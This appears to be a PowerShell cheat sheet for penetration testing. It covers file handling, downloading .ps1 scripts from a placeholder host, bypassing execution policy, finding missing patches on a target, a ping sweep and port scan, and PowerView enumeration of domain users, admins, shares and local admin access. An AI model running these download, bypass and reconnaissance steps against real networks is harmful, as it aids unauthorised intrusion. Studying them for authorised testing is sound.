# __Manipulating files__

## __Start-Process__

```powershell
Start-Process notepad.exe # start a process
```

## __Get-Process__

```powershell
Get-Process # list all running processes
Get-Process -Name notepad # filter for a specific process name
```
Especially with command outputs that may be difficult to read or need further processing appending the `Export-Csv` command will create a CSV file with the output of the first command.

```powershell
Get-Process | Export-Csv file.csv
```

## __Get-Content__

```powershell
Get-Content .\file.txt # similar to cat or type
```

## __Copy-Item__

Files can be copied and moved with `Copy-Item` and `Move-Item`, respectively.

```powershell
Copy-Item .\file.txt copy_file.txt
```

## __Get-FileHash__

```powershell
Get-FileHash -Algorithm SHA256 .\file.txt
Get-FileHash -Algorithm MD5 .\file.txt
```

# __Downloading files__

```powershell
(New-Object System.Net.WebClient).Downloadfile('http://x.x.x.x/file.ps1', 'file.ps1')
```

```powershell
Invoke-WebRequest "http://x.x.x.x/file.ps1" -OutFile "file2.ps1"
```

`ExecutionPolicy` is NOT a security feature. It merely functions as an added safety measure and can be bypassed by the user.

The current state of the ExecutionPolicy configuration can be seen using `Get-ExecutionPolicy -list`.

## __Bypass execution policy__

```powershell
powershell -ExecutionPolicy Bypass -File .\file.ps1
Set-ExecutionPolicy Bypass -Scope Process
```

The `-scope` parameter will set the execution policy only for the current PowerShell session and will go back to the initial settings once the PowerShell session is closed.

# __System Reconnaissance__

## __Finding Missing Patches__

```powershell
Get-Hotfix # enumerate installed patches
```

To make things easier, we could output the result of the Get-Hotfix command in a list format and grep it further using the `findstr` command. The example below shows how the installation date of patches could be listed to have a better idea about update cycles on the target.

```powershell
Get-Hotfix | Format-list | findstr InstalledOn
```

```powershell
Get-Hotfix | Format-Table HotFixID # list only HotFixID column
```

```powershell
dir | Format-List # can also be used to gather more information about objects
dir | Format-List *
```

```powershell
Get-Hotfix | Out-File hotfix.txt # save the output
```

```powershell
Get-Command -Name Out*
```

The `GridView` option provides a nice GUI with sortable columns for any output that can be overwhelming on the CLI.

```powershell
Get-Process | Out-GridView
```

# __Network Reconnaissance__

We will ping the IP addresses from 10.0.2.1 to 10.0.2.15.

```powershell
1..15 | %{echo "10.0.2.$_"; ping -n 1 10.0.2.$_ | Select-String ttl}
```

A similar command can be built using the existing socket and TCP client functions. In the example below, we scan the first 1024 TCP ports of the target. 

```powershell
1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null
```

# __Using PowerView__

## __Get-NetDomainController__

```powershell
Get-NetDomainController # Information on the domain controller
```

## __Get-NetUser__

```powershell
Get-NetUser # list of domain users
Get-NetUser | out-gridview
(Get-NetUser).name # list only the users' name
Get-NetUser | select -ExpandProperty lastlogon  # list users' last logon
```

## __Get-NetComputer__

```powershell
Get-NetComputer # enumerate systems connected to the domain
Get-NetComputer -ping # enumerate de systems that are currently online
```

## __Get-NetGroup__

```powershell
Get-NetGroup # enumerate existing groups
Get-NetGroupMember "Domain Admins" # enumerate members of the group
```

 ## __Finding shares__

 ```powershell
Find-DomainShare # list available shares
Find-DomainShare -CheckShareAccess # list only readable shares
 ```

## __Enumerate Group Policy__

Group Policy is used to configure computers connected to the domain.

```powershell
Get-NetGPO # gather information on enforced policies
```

## __Get-NetDomainTrust__

```powershell
Get-NetDomainTrust # list any domain you may access
```

## __User Enumeration__

```powershell
Find-LocalAdminAccess # list systems in the domain you may access as a local administrator
```

